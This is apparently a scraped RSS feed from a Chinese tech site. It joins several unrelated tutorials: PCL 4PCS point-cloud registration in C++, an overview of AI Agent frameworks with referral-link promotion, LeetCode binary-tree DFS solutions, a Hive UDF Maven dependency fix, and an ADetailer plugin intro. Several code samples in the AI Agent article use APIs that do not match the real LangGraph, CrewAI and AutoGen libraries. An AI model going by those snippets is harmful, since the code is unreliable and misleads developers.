4PCS 算法具有较好的抗噪性和计算效率，适用于较大尺度的点云配准场景。
1.1原理
4PCS 算法通过以下步骤进行粗配准：
点云采样：
从源点云和目标点云中采样若干点，形成四点集合。
几何一致性验证：
计算这四个点在两个点云中的相对距离，通过几何一致性约束找到符合要求的四点集合。
估计变换矩阵：
使用一致的四点集合，计算源点云到目标点云的变换矩阵。
应用变换矩阵：
将计算得到的变换矩阵应用到源点云上，使其与目标点云对齐。
配准结果的质量依赖于：
重叠率：
设置源点云和目标点云的近似重叠率。
采样点数量：
设置参与匹配的采样点数量。
精度参数 Delta：
控制配准的精度，通过对配准点云的稀疏化进行加速。
1.2实现步骤
加载源点云和目标点云。
设置4PCS配准参数：包括近似重叠率、采样点数量、精度参数等。
执行4PCS粗配准：通过设置参数执行粗配准，得到变换矩阵。
应用变换矩阵：将源点云应用变换矩阵对齐至目标点云。
可视化结果：将源点云、目标点云以及对齐后的点云进行可视化对比。
1.3应用场景
粗配准阶段：
4PCS 可以用于点云配准的初步阶段，提供较为快速的粗略对齐结果，后续可以使用更精细的算法（如
ICP
）进行精配准。
多场景拼接：
在多视角点云场景下，
4PCS
可以帮助快速匹配不同视角的点云数据。
点云地图生成
：在SLAM（同步定位与地图构建）中，
4PCS
可以用于不同帧之间的点云匹配与对齐。
二、代码实现
2.1关键函数
2.1.1 加载点云数据
void loadPointClouds(pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr&amp; source_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr&amp; target_cloud)
{if (pcl::io::loadPCDFile&lt;pcl::PointXYZ&gt;("hand_trans.pcd", *target_cloud) == -1) {PCL_ERROR("读取目标点云失败 \n");}if (pcl::io::loadPCDFile&lt;pcl::PointXYZ&gt;("hand.pcd", *source_cloud) == -1) {PCL_ERROR("读取源点云失败 \n");}
}
2.1.2 执行4PCS粗配准
void perform4PCSRegistration(pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr source_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr target_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr aligned_cloud, Eigen::Matrix4f&amp; transformation_matrix)
{pcl::registration::FPCSInitialAlignment&lt;pcl::PointXYZ, pcl::PointXYZ&gt; fpcs;fpcs.setInputSource(source_cloud);fpcs.setInputTarget(target_cloud);fpcs.setApproxOverlap(0.7);         // 设置近似重叠率fpcs.setDelta(0.01);                // 精度参数fpcs.setNumberOfSamples(100);       // 采样点数量fpcs.align(*aligned_cloud);         // 执行配准transformation_matrix = fpcs.getFinalTransformation(); // 获取变换矩阵
}
2.1.3 可视化源点云、目标点云和配准结果
// 可视化源点云、目标点云和配准结果
void visualizePointClouds(pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr source_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr target_cloud)
{boost::shared_ptr&lt;pcl::visualization::PCLVisualizer&gt; viewer(new pcl::visualization::PCLVisualizer("Point Cloud Registration Viewer"));viewer-&gt;setBackgroundColor(1.0, 1.0, 1.0);  // 设置背景颜色为黑色pcl::visualization::PointCloudColorHandlerCustom&lt;pcl::PointXYZ&gt; target_color(target_cloud, 255, 0, 0);viewer-&gt;addPointCloud(target_cloud, target_color, "target cloud"); // 目标点云（红色）pcl::visualization::PointCloudColorHandlerCustom&lt;pcl::PointXYZ&gt; source_color(source_cloud, 0, 0, 255);viewer-&gt;addPointCloud(source_cloud, source_color, "source cloud"); // 源点云（蓝色）viewer-&gt;setPointCloudRenderingProperties(pcl::visualization::PCL_VISUALIZER_POINT_SIZE, 2, "target cloud");viewer-&gt;setPointCloudRenderingProperties(pcl::visualization::PCL_VISUALIZER_POINT_SIZE, 2, "source cloud");while (!viewer-&gt;wasStopped()) {viewer-&gt;spinOnce();}
}
2.2完整代码
#include &lt;iostream&gt;
#include &lt;pcl/io/pcd_io.h&gt;
#include &lt;pcl/point_types.h&gt;
#include &lt;pcl/registration/ia_fpcs.h&gt;
#include &lt;pcl/console/time.h&gt;
#include &lt;boost/thread/thread.hpp&gt;
#include &lt;pcl/visualization/pcl_visualizer.h&gt;// 加载点云数据
void loadPointClouds(pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr&amp; source_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr&amp; target_cloud)
{if (pcl::io::loadPCDFile&lt;pcl::PointXYZ&gt;("hand_trans.pcd", *target_cloud) == -1) {PCL_ERROR("读取目标点云失败 \n");}if (pcl::io::loadPCDFile&lt;pcl::PointXYZ&gt;("hand.pcd", *source_cloud) == -1) {PCL_ERROR("读取源点云失败 \n");}
}// 执行4PCS粗配准
void perform4PCSRegistration(pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr source_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr target_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr aligned_cloud, Eigen::Matrix4f&amp; transformation_matrix)
{pcl::registration::FPCSInitialAlignment&lt;pcl::PointXYZ, pcl::PointXYZ&gt; fpcs;fpcs.setInputSource(source_cloud);fpcs.setInputTarget(target_cloud);fpcs.setApproxOverlap(0.7);         // 设置近似重叠率fpcs.setDelta(0.01);                // 精度参数fpcs.setNumberOfSamples(1000);       // 采样点数量fpcs.align(*aligned_cloud);         // 执行配准transformation_matrix = fpcs.getFinalTransformation(); // 获取变换矩阵
}// 可视化源点云、目标点云和配准结果
// 可视化源点云、目标点云和配准结果
void visualizePointClouds(pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr source_cloud, pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr target_cloud)
{boost::shared_ptr&lt;pcl::visualization::PCLVisualizer&gt; viewer(new pcl::visualization::PCLVisualizer("Point Cloud Registration Viewer"));viewer-&gt;setBackgroundColor(1.0, 1.0, 1.0);  // 设置背景颜色为黑色pcl::visualization::PointCloudColorHandlerCustom&lt;pcl::PointXYZ&gt; target_color(target_cloud, 255, 0, 0);viewer-&gt;addPointCloud(target_cloud, target_color, "target cloud"); // 目标点云（红色）pcl::visualization::PointCloudColorHandlerCustom&lt;pcl::PointXYZ&gt; source_color(source_cloud, 0, 0, 255);viewer-&gt;addPointCloud(source_cloud, source_color, "source cloud"); // 源点云（蓝色）viewer-&gt;setPointCloudRenderingProperties(pcl::visualization::PCL_VISUALIZER_POINT_SIZE, 2, "target cloud");viewer-&gt;setPointCloudRenderingProperties(pcl::visualization::PCL_VISUALIZER_POINT_SIZE, 2, "source cloud");while (!viewer-&gt;wasStopped()) {viewer-&gt;spinOnce();}
}int main(int argc, char** argv)
{pcl::console::TicToc time;pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr target_cloud(new pcl::PointCloud&lt;pcl::PointXYZ&gt;);pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr source_cloud(new pcl::PointCloud&lt;pcl::PointXYZ&gt;);loadPointClouds(source_cloud, target_cloud);pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr aligned_cloud(new pcl::PointCloud&lt;pcl::PointXYZ&gt;);Eigen::Matrix4f transformation_matrix;time.tic();perform4PCSRegistration(source_cloud, target_cloud, aligned_cloud, transformation_matrix);cout &lt;&lt; "FPCS配准用时： " &lt;&lt; time.toc() &lt;&lt; " ms" &lt;&lt; endl;cout &lt;&lt; "变换矩阵：" &lt;&lt; transformation_matrix &lt;&lt; endl;//显示原始点云visualizePointClouds(source_cloud, target_cloud);//显示配准后点云visualizePointClouds(target_cloud, aligned_cloud);return 0;
}
三、实现效果
3.1原始点云
3.2配准后点云</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540014.html</guid><pubDate>Fri, 31 Oct 2025 07:20:43 +0000</pubDate></item><item><title>【人工智能】大模型的崛起为AI Agent注入了“聪明的大脑”，彻底改变了定义!</title><link>https://www.ppmy.cn/news/1540015.html</link><description>在人工智能的迅猛发展中，大模型的崛起为AI Agent注入了“聪明的大脑”，彻底改变了其定义。如今，基于大模型的AI Agent架构已成为企业应用大模型的首选方案。本文将深入探讨AI Agent的构建、框架选择及其在实际应用中的重要性，帮助开发者高效构建智能系统。
文章目录
1. AI Agent的基本概念
1.1 AI Agent的优势
1.2 AI Agent的应用场景
2. AI Agent框架的构建
2.1 什么是AI Agent框架？
2.2 AI Agent框架的组成部分
2.3 AI Agent框架的重要性
3. 如何选择AI Agent框架？
3.1 LangChain
3.2 LangGraph
3.3 CrewAI
3.4 Semantic Kernel
3.5 AutoGen
4. 如何学习大模型AI？
第一阶段（10天）：初阶应用
第二阶段（30天）：高阶应用
第三阶段（30天）：模型训练
第四阶段（20天）：商业闭环
5. AI Agent的未来发展趋势
5.1 更加智能化
5.2 多模态交互
5.3 自适应学习
5.4 安全与隐私
随着AI技术的普及，安全与隐私问题将成为重要关注点，AI Agent需要具备更强的安全性和合规性。例如，金融行业的AI Agent在处理用户数据时，必须遵循GDPR等法律法规，确保用户隐私不被侵犯。
结尾
【上百种AI工作流（Agent）落地场景】https://www.nyai.chat/chat?invite=nyai_1141439&amp;fromChannel=csdn
1. AI Agent的基本概念
AI Agent是指能够自主感知环境、做出决策并执行任务的智能系统。当前，AI Agent架构主要由四个核心要素构成：规划（Planning）、记忆（Memory）、工具（Tools）和执行（Action）。借助大模型的强大能力，AI Agent在解决复杂问题方面实现了质的飞跃。
1.1 AI Agent的优势
智能决策
：依托大模型的推理能力，AI Agent能够做出更精准的决策，甚至在不确定性高的环境中进行合理推断。
自我学习
：通过记忆和学习机制，AI Agent持续提升自身性能，能够根据历史数据和新信息进行自我优化。
多任务处理
：AI Agent具备同时处理多个任务的能力，显著提高工作效率，适用于动态变化的工作环境。
1.2 AI Agent的应用场景
AI Agent的应用范围广泛，覆盖多个行业。以下是一些典型场景：
客户服务
：作为虚拟客服，AI Agent能够有效处理客户咨询，提高满意度，并实现24/7服务。
智能助手
：在个人助理应用中，AI Agent帮助用户管理日程、提醒事项及信息检索，提升生活和工作效率。
自动化办公
：借助AI Agent，企业可实现文档处理、数据分析和任务分配的自动化，减少人工成本。
游戏开发
：在游戏中，AI Agent作为非玩家角色（NPC），提供更真实的互动体验，增强玩家沉浸感。
2. AI Agent框架的构建
2.1 什么是AI Agent框架？
AI Agent框架是一种软件平台，旨在简化AI Agent的创建、部署和管理。它为开发人员提供了预设组件、抽象概念和工具，使得复杂的人工智能系统开发变得更加高效。
2.2 AI Agent框架的组成部分
AI Agent框架通常包括以下几个核心组成部分：
Agent架构
：定义AI Agent内部组织的结构，包括决策过程、记忆系统和交互能力。
环境界面
：连接Agent与其运行环境的工具，确保Agent能够感知外部信息。
任务管理
：定义、分配和跟踪Agent任务完成情况的系统，确保任务的高效执行。
通信协议
：实现Agent之间及与人类之间互动的方法，促进信息交流。
学习机制
：实施机器学习算法，让Agent随着时间推移不断提高性能，适应新的挑战。
集成工具
：连接Agent与外部数据源、应用程序接口的工具，扩展其功能。
监控和调试
：观察Agent行为、跟踪性能和发现问题的功能，确保系统的可靠性和稳定性。
2.3 AI Agent框架的重要性
AI Agent框架在推动人工智能发展方面发挥着至关重要的作用：
加速开发
：通过提供预设组件和最佳实践，减少创建复杂AI Agent所需的时间和精力。
标准化
：促进开发人员以一致的方法应对共同的挑战，促进人工智能领域的合作与知识共享。
可扩展性
：支持从简单的单Agent应用到复杂的多Agent环境的系统开发，适应不同规模的需求。
可访问性
：使更多的开发人员和研究人员更容易获得先进的人工智能技术，降低学习门槛。
3. 如何选择AI Agent框架？
市场上已有多种AI Agent框架可供使用，本文将对主流的五种AI Agent框架进行横向对比，帮助开发人员选择最适合其特定需求的工具。
3.1 LangChain
特点
：注重集成性和灵活性，为创建基于LLM的AI Agent提供了灵活直观的方法。
适用场景
：对话式AI助手、自主任务完成系统、个性化推荐系统等。
LangChain的主要功能
：
from
langchain
import
LLMChain
,
PromptTemplate
# 创建一个简单的对话链
template
=
PromptTemplate
(
input_variables
=
[
"input"
]
,
template
=
"你能告诉我关于{input}的事情吗？"
)
chain
=
LLMChain
(
llm
=
your_llm_model
,
prompt
=
template
)
response
=
chain
.
run
(
input
=
"人工智能"
)
print
(
response
)
3.2 LangGraph
特点
：扩展LangChain的功能，支持创建复杂、有状态和多Agent应用。
适用场景
：交互式叙事引擎、复杂的决策系统、模拟multi-Agent生态系统等。
LangGraph的主要功能
：
from
langgraph
import
GraphAgent
# 创建一个有状态的Agent
agent
=
GraphAgent
(
name
=
"决策Agent"
)
# 定义Agent的任务
agent
.
add_task
(
"分析市场趋势"
)
agent
.
add_task
(
"生成销售报告"
)
# 执行任务
agent
.
run
(
)
3.3 CrewAI
特点
：创建基于角色的协作式人工智能系统，模仿人类团队结构。
适用场景
：高级项目管理模拟、协作式创意写作系统、金融市场分析等。
CrewAI的主要功能
：
from
crewai
import
Team
# 创建一个团队
team
=
Team
(
name
=
"项目团队"
)
# 添加角色
team
.
add_member
(
"项目经理"
)
team
.
add_member
(
"开发者"
)
# 分配任务
team
.
assign_task
(
"开发新功能"
,
member
=
"开发者"
)
3.4 Semantic Kernel
特点
：缩小传统软件开发与人工智能之间的差距，强调无缝集成。
适用场景
：企业级对话机器人、智能流程自动化、个性化内容推荐系统等。
Semantic Kernel的主要功能
：
using
SemanticKernel
;
var
kernel
=
new
Kernel
(
)
;
kernel
.
AddFunction
(
"获取用户信息"
,
GetUserInfo
)
;
// 调用函数
var
userInfo
=
kernel
.
Invoke
(
"获取用户信息"
,
new
{
userId
=
123
}
)
;
3.5 AutoGen
特点
：开源框架，强调模块化、可扩展性和易用性。
适用场景
：高级AI对话系统、自动编码助手、复杂的问题解决和决策系统等。
AutoGen的主要功能
：
from
autogen
import
MultiAgent
# 创建多个Agent
agents
=
MultiAgent
(
agents
=
[
"Agent1"
,
"Agent2"
]
)
# 进行对话
response
=
agents
.
chat
(
"你好，Agent1！"
)
print
(
response
)
4. 如何学习大模型AI？
随着AI技术的不断进步，掌握大模型AI将为个人职业发展带来竞争优势。以下是学习大模型AI的分阶段计划：
第一阶段（10天）：初阶应用
了解大模型AI的基本概念和应用场景
：掌握大模型的基本原理和应用领域。
示例
：通过阅读相关文献和在线课程，了解GPT-3、BERT等大模型的基本架构和应用案例。
学习如何调教AI并用代码将大模型与业务衔接
：通过实例学习如何将AI应用于实际业务中。
示例
：使用Python和TensorFlow/Keras等框架，尝试调教一个简单的文本生成模型。
第二阶段（30天）：高阶应用
学会构造私有知识库，扩展AI的能力
：掌握如何为AI提供更多的知识支持。
示例
：构建一个知识图谱，将行业相关数据整合到AI模型中，以提高其决策能力。
快速开发一个完整的基于Agent的对话机器人
：通过实践项目提升开发能力。
示例
：使用LangChain框架，开发一个能够处理客户咨询的对话机器人，并进行测试和优化。
第三阶段（30天）：模型训练
学习如何训练自己的垂直大模型，掌握更多技术方案
：深入理解模型训练的过程和方法。
示例
：在Kaggle等平台上参与比赛，利用真实数据集训练模型，积累实践经验。
第四阶段（20天）：商业闭环
了解全球大模型的性能、成本等方面，找到适合自己的项目方向
：掌握市场动态，寻找商业机会。
示例
：分析市场上现有的AI产品，评估其商业模式，寻找未被满足的需求。
5. AI Agent的未来发展趋势
随着技术的不断进步，AI Agent的未来发展将呈现以下趋势：
5.1 更加智能化
AI Agent将不断提升智能水平，能够处理更复杂的任务和决策。例如，未来的AI Agent可以在医疗领域中，分析患者的病历数据，提供个性化的治疗方案。
5.2 多模态交互
未来的AI Agent将支持多种交互方式，如语音、图像和文本等，提供更为丰富的用户体验。例如，结合语音识别和图像处理技术的AI Agent，可以在智能家居中实现语音控制和视觉识别。
5.3 自适应学习
AI Agent将具备自适应学习能力，能够根据用户的反馈和环境变化不断优化自身性能。例如，在线教育平台中的AI助教可以根据学生的学习进度和反馈，调整教学策略。
5.4 安全与隐私
随着AI技术的普及，安全与隐私问题将成为重要关注点，AI Agent需要具备更强的安全性和合规性。例如，金融行业的AI Agent在处理用户数据时，必须遵循GDPR等法律法规，确保用户隐私不被侵犯。
🔥codemoss_能用AI
【无限GPT4.omini】
【拒绝爬梯】
【上百种AI工作流落地场景】
【主流大模型集聚地：GPT-4o-Mini、GPT-3.5 Turbo、GPT-4 Turbo、GPT-4o、GPT-o1、Claude-3.5-Sonnet、Gemini Pro、月之暗面、文心一言 4.0、通易千问 Plus等众多模型】
🔥传送门：https://www.nyai.chat/chat?invite=nyai_1141439&amp;fromChannel=csdn
结尾
在大模型时代，AI Agent的构建与应用将成为推动企业创新的重要力量。通过选择合适的AI Agent框架，开发人员能够高效构建智能系统，提升工作效率和决策能力。希望本文能为您在AI Agent的学习与应用中提供有价值的指导。
如果您对AI Agent的构建和应用有更多的疑问或想法，欢迎在评论区留言讨论！同时，关注我的CSDN博客，获取更多关于人工智能和大模型的最新资讯与教程！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540015.html</guid><pubDate>Fri, 31 Oct 2025 07:20:45 +0000</pubDate></item><item><title>递归——二叉树中的深搜</title><link>https://www.ppmy.cn/news/1540016.html</link><description>文章目录
计算布尔二叉树的值
求根节点到叶节点数字之和
二叉树剪枝
验证二叉搜索树
二叉搜索树中第 K 小的元素
二叉树的所有路径
二叉树中的深搜有三种方法
前序遍历
根-&gt;左子树-&gt;右子树
中序遍历
左子树-&gt;根-&gt;右子树
前序遍历
左子树-&gt;右子树-&gt;根
计算布尔二叉树的值
题目：计算布尔二叉树的值
思路
如果当前节点
node
为叶子节点，那么节点的值为它本身
如果当前节点
node
含有孩子节点，对其孩子节点进行递归，计算出其左右孩子节点的值为；
如果
node == 2
，返回两孩子节点的
|
运算结果；如果
node == 3
，返回两孩子节点的
&amp;
运算结果；
因为是完全二叉树：每个节点有
0
个或者
2
个孩子的二叉树。
所以对于递归出口，我们仅需判断当前节点的左孩子是否为空，如果为空，则当前节点为叶子节点；
C++代码
/*** Definition for a binary tree node.* struct TreeNode {*     int val;*     TreeNode *left;*     TreeNode *right;*     TreeNode() : val(0), left(nullptr), right(nullptr) {}*     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}*     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}* };*/
class
Solution
{
public
:
bool
evaluateTree
(
TreeNode
*
root
)
{
if
(
root
-&gt;
left
==
nullptr
)
{
return
root
-&gt;
val
;
}
if
(
root
-&gt;
val
==
2
)
return
evaluateTree
(
root
-&gt;
left
)
||
evaluateTree
(
root
-&gt;
right
)
;
else
return
evaluateTree
(
root
-&gt;
left
)
&amp;&amp;
evaluateTree
(
root
-&gt;
right
)
;
}
}
;
求根节点到叶节点数字之和
题目：求根节点到叶节点数字之和
思路
从根节点开始，遍历每个节点，如果遇到叶子节点，则将叶子节点对应的数字加到数字之和。如果当前节点不是叶子节点，则计算其子节点对应的数字，然后对子节点递归遍历。
C++代码
/*** Definition for a binary tree node.* struct TreeNode {*     int val;*     TreeNode *left;*     TreeNode *right;*     TreeNode() : val(0), left(nullptr), right(nullptr) {}*     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}*     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}* };*/
class
Solution
{
public
:
int
dfs
(
TreeNode
*
root
,
int
preSum
)
{
preSum
=
preSum
*
10
+
root
-&gt;
val
;
if
(
root
-&gt;
left
==
nullptr
&amp;&amp;
root
-&gt;
right
==
nullptr
)
return
preSum
;
int
res
=
0
;
if
(
root
-&gt;
left
)
res
+=
dfs
(
root
-&gt;
left
,
preSum
)
;
if
(
root
-&gt;
right
)
res
+=
dfs
(
root
-&gt;
right
,
preSum
)
;
return
res
;
}
int
sumNumbers
(
TreeNode
*
root
)
{
return
dfs
(
root
,
0
)
;
}
}
;
二叉树剪枝
题目：二叉树剪枝
思路
返回移除了所有不包含
1
的子树的原二叉树。
意思即，删除所有子树没有
1
的节点
我们要根据其左右子树的状态来判断当前节点能否删除，所有我们使用后序遍历
C++代码
/*** Definition for a binary tree node.* struct TreeNode {*     int val;*     TreeNode *left;*     TreeNode *right;*     TreeNode() : val(0), left(nullptr), right(nullptr) {}*     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}*     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}* };*/
class
Solution
{
public
:
TreeNode
*
pruneTree
(
TreeNode
*
root
)
{
if
(
!
root
)
{
return
nullptr
;
}
root
-&gt;
left
=
pruneTree
(
root
-&gt;
left
)
;
root
-&gt;
right
=
pruneTree
(
root
-&gt;
right
)
;
if
(
!
root
-&gt;
left
&amp;&amp;
!
root
-&gt;
right
&amp;&amp;
root
-&gt;
val
==
0
)
{
delete
root
;
root
=
nullptr
;
}
return
root
;
}
}
;
验证二叉搜索树
题目：验证二叉搜索树
思路
二叉搜索树：左子树小于根节点；右子树大于根节点
我们知道，二叉搜索树的中序遍历结果是一个有序的数组
，所以我们会有这样一个想法：对其进行中序遍历，并将每一个结果的值保存在一个数组中，最后判断该数组是否有序；
使用一个全局变量存储上一个用于对比的数值
C++代码
/*** Definition for a binary tree node.* struct TreeNode {*     int val;*     TreeNode *left;*     TreeNode *right;*     TreeNode() : val(0), left(nullptr), right(nullptr) {}*     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}*     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}* };*/
class
Solution
{
long
prev
=
LONG_MIN
;
public
:
bool
isValidBST
(
TreeNode
*
root
)
{
if
(
!
root
)
return
true
;
if
(
!
isValidBST
(
root
-&gt;
left
)
)
return
false
;
if
(
prev
!=
LONG_MIN
&amp;&amp;
(
root
-&gt;
val
&lt;=
prev
)
)
return
false
;
prev
=
root
-&gt;
val
;
return
isValidBST
(
root
-&gt;
right
)
;
}
}
;
二叉搜索树中第 K 小的元素
题目：二叉搜索树中第 K 小的元素
思路
两个全局变量 + 中序遍历
一个来标记，次数
count
；
一个来标记，结果
ret
；
C++代码
/*** Definition for a binary tree node.* struct TreeNode {*     int val;*     TreeNode *left;*     TreeNode *right;*     TreeNode() : val(0), left(nullptr), right(nullptr) {}*     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}*     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}* };*/
class
Solution
{
int
count
,
ret
;
void
dfs
(
TreeNode
*
root
)
{
if
(
!
root
||
!
count
)
return
;
dfs
(
root
-&gt;
left
)
;
if
(
!
(
--
count
)
)
ret
=
root
-&gt;
val
;
dfs
(
root
-&gt;
right
)
;
}
public
:
int
kthSmallest
(
TreeNode
*
root
,
int
k
)
{
count
=
k
;
dfs
(
root
)
;
return
ret
;
}
}
;
二叉树的所有路径
二叉树的所有路径
题目：二叉树的所有路径
思路
在
dfs
函数中，首先将当前节点的值转换为字符串并添加到
path
中。
检查当前节点是否为叶子节点（即没有左子节点和右子节点）。如果是叶子节点，将
path
添加到结果数组
res
中，并返回。
如果当前节点不是叶子节点，则继续递归搜索其左子节点和右子节点。
在递归调用
dfs
时，对于非叶子节点，需要在
path
后添加
-&gt;
符号
C++代码
/*** Definition for a binary tree node.* struct TreeNode {*     int val;*     TreeNode *left;*     TreeNode *right;*     TreeNode() : val(0), left(nullptr), right(nullptr) {}*     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}*     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}* };*/
class
Solution
{
void
dfs
(
TreeNode
*
root
,
string path
,
vector
&lt;
string
&gt;
&amp;
res
)
{
path
+=
to_string
(
root
-&gt;
val
)
;
if
(
root
-&gt;
left
==
nullptr
&amp;&amp;
root
-&gt;
right
==
nullptr
)
// 叶子节点不添加 "-&gt;"
{
res
.
push_back
(
path
)
;
return
;
}
if
(
root
-&gt;
left
)
dfs
(
root
-&gt;
left
,
path
+
"-&gt;"
,
res
)
;
if
(
root
-&gt;
right
)
dfs
(
root
-&gt;
right
,
path
+
"-&gt;"
,
res
)
;
return
;
}
public
:
vector
&lt;
string
&gt;
binaryTreePaths
(
TreeNode
*
root
)
{
vector
&lt;
string
&gt;
res
;
string path
;
dfs
(
root
,
path
,
res
)
;
return
res
;
}
}
;</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540016.html</guid><pubDate>Fri, 31 Oct 2025 07:20:47 +0000</pubDate></item><item><title>hive自定义函数缺包报错，以及运行时与hive冲突解决</title><link>https://www.ppmy.cn/news/1540017.html</link><description>一.问题描述
仅描述了从配置到打包上传的过程，想要看解决请直接跳到下文的对应模块。
在使用hive设置自定义函数的时候在pom.xml中配置如下依赖，使其打包的时候带依赖打包：
&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.hive&lt;/groupId&gt;&lt;artifactId&gt;hive-exec&lt;/artifactId&gt;&lt;version&gt;3.1.2&lt;/version&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/org.apache.hadoop/hadoop-common --&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;&lt;artifactId&gt;hadoop-common&lt;/artifactId&gt;&lt;version&gt;3.3.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;redis.clients&lt;/groupId&gt;&lt;artifactId&gt;jedis&lt;/artifactId&gt;&lt;version&gt;3.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;&lt;artifactId&gt;fastjson&lt;/artifactId&gt;&lt;version&gt;2.0.50&lt;/version&gt;&lt;/dependency&gt;
&lt;/dependencies&gt;
&lt;build&gt;&lt;plugins&gt;&lt;plugin&gt;&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;&lt;version&gt;3.8.0&lt;/version&gt;&lt;configuration&gt;&lt;source&gt;1.8&lt;/source&gt;&lt;target&gt;1.8&lt;/target&gt;&lt;/configuration&gt;&lt;/plugin&gt;&lt;plugin&gt;&lt;artifactId&gt;maven-assembly-plugin &lt;/artifactId&gt;&lt;configuration&gt;&lt;descriptorRefs&gt;&lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;&lt;/descriptorRefs&gt;&lt;archive&gt;&lt;manifest&gt;&lt;mainClass&gt;com.yunhe.UrlTransUdf&lt;/mainClass&gt;&lt;/manifest&gt;&lt;/archive&gt;&lt;/configuration&gt;&lt;executions&gt;&lt;execution&gt;&lt;id&gt;make-assembly&lt;/id&gt;&lt;phase&gt;package&lt;/phase&gt;&lt;goals&gt;&lt;goal&gt;single&lt;/goal&gt;&lt;/goals&gt;&lt;/execution&gt;&lt;/executions&gt;&lt;/plugin&gt;&lt;/plugins&gt;
&lt;/build&gt;
打包如下：
一个是纯代码的较小，而另一个较大的就是我们需要的带依赖的jar包。
打好的包放到hive的lib里然后尝试使用：
二.报错与解决
运行hive添加jar包，函数：
add jar /opt/installs/hive/lib/mymonth-1.0-SNAPSHOT-jar-with-dependencies.jar;
create temporary function hurl as 'org.bigdata.IpToLocation';
在虚拟机hive尝试：
发现报错如下，那根据报错可以看出jar包执行成功是我们的hive和hadoop有问题，
那么是我们的jar包配置打包了hive和hadoop的依赖，但是却在hive中执行时引起了冲突：
但是为了在编写java的时候却又需要使用这两个配置，比较的麻烦
那么在maven中依赖是
有生命周期
的，所以要通过这方面来入手：
A 依赖 B，需要在 A 的 pom.xml 文件中添加 B 的坐标，添加坐标时需要指定依赖范围，依赖范围包括：
compile：编译范围，指 A 在编译时依赖 B，此范围为默认依赖范围。编译范围的依赖会用在编译、测试、运行，由于运行时需要所以编译范围的依赖会被打包。
provided：provided 依赖只有在当JDK 或者一个容器已提供该依赖之后才使用， provided 依赖在编译和测试时需要，在运行时不需要，比如：servlet api 被tomcat 容器提供。
runtime：runtime   依赖在运行和测试系统的时候需要，但在编译的时候不需要。比如：jdbc 的驱动包。由于运行时需要所以runtime 范围的依赖会被打包。
test：test 范围依赖 在编译和运行时都不需要，它们只有在测试编译和测试运行阶段可用， 比如：junit。由于运行时不需要所以test 范围依赖不会被打包。
system：system 范围依赖与 provided 类似，但是你必须显式的提供一个对于本地系统中JAR文件的路径，需要指定 systemPath 磁盘路径，system 依赖不推荐使用。
而我们的需求是编译需要，但是运行不需要以免与hive冲突，因此使用
provided
。
在pom.xml添加如下后重新加载打包并且上传：
再次运行即可成功！
但是注意
：如果是在可视化软件运行那么需要重启hive！否则你的更改不会生效。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540017.html</guid><pubDate>Fri, 31 Oct 2025 07:20:50 +0000</pubDate></item><item><title>4.stable-diffusion-webui1.10.0--图像修复（adetailer）插件</title><link>https://www.ppmy.cn/news/1540018.html</link><description>ADetailer是Stable Diffusion WebUI的一个插件，它通过深度学习模型智能检测图像中的人脸、手部及身体等关键部位，并自动进行重绘修复，使得生成的图像更加自然、符合预期。
ADetailer插件主要应用于图像的细节增强、降噪和修复，特别适用于面部瑕疵如痘痘、皱纹、色斑等的修复。它提供了高效的处理速度和精细的调整能力，因此在人脸修复方面受到用户的青睐。
优势：
智能检测：ADetailer能够智能识别图像中的人脸、手部等关键部位，无需手动绘制蒙版。
一键修复：自动进行重绘修复，省去了繁琐的手动调整过程，大大提高了创作效率。
高质量输出：修复后的图像质量显著提升，人脸更加自然、五官更加清晰。
多样化模型：提供了多种检测模型供用户选择，适用于不同的修复需求。
实用场景：
人物插画：在绘制人物插画时，确保人脸的精致和自然。
游戏设计：在游戏角色设计中，修复因像素占比过少而导致的人脸扭曲问题。
广告设计：在广告图像制作中，提升人物形象的逼真度和吸引力。
图像修复、医学影像、遥感图像处理等多个领域。
插件安装
adetailer详细说明：
https://github.com/Bing-su/adetailer
注：
从网址安装可以保证插件的更新能在 WebUI 中自动显示，如果是下载压缩包文件放进根目录，就无法自动更新
。
下面执行网址安装。
